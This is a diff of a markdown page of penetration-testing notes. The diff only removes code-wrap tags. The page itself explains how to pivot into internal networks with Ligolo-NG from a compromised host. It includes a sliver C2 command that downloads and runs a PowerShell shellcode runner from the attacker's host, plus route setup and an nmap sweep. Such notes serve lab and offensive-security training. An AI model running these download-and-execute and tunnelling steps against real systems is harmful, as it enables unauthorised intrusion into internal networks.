@@ -18,7 +18,6 @@ note: Requires x64 bit process to run
 
 ## Setup Ligolo-NG Server
 Example Setup
-{% code overflow="wrap" %}
 ```bash
 # Compromised host is accessible via 192.168.243.0 network, want to access hosts on the internal 172.16.243.0 network
 # Kali box is hosted on 192.168.45.0/24 and can communicate to 192.168.243.0/24 network
@@ -35,7 +34,6 @@ ETH1: 172.16.243.159
 ┌──(kali㉿kali)-[~]
 └─$ ligolo-proxy -selfcert
 ```
-{% endcode %}
 
 ## Setup Ligolo-NG Client Agents
 This step will require you to transfer files to host or use powershell to run ligolo.ps1 shellcode runner (recommended)
@@ -48,7 +46,6 @@ To send request through sliver session via sharpsh
 sliver (interactive) > sharpsh -- '-e -c <base64encoded>iex(iwr http://192.168.45.227/ligolo.ps1 -UseBasicParsing)'
 
 ## Setup Proxy
-{% code overflow="wrap" %}
 ```bash
 # Step 3 - Go to ligolo-proxy server console on kali and wait for Agent connection info will be displayed as such: 
 ligolo-ng >> INFO [001] Agent Joined
@@ -70,13 +67,11 @@ ligolo-ng >> session
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sn 172.16.243.150-155 -vv
 ```
-{% endcode %}
 
 ## Setup additional hop to a secondary network
 It should be noted, that C2 Agent Pivots should be used here instead of using ligolo-ng tunneling to communicate with the other networks. 
 
 Example Setup
-{% code overflow="wrap" %}
 ```bash
 # Compromised host is accessible via 192.168.243.0 network, want to access hosts on the internal 172.16.243.0 network
 # Victim 1
@@ -115,4 +110,3 @@ ligolo-ng >> session
 ┌──(kali㉿kali)-[~]
 └─$ sudo ip add route 10.10.3.0/24 dev ligolo-ligolo-2ndHost
 ```
-{% endcode %}
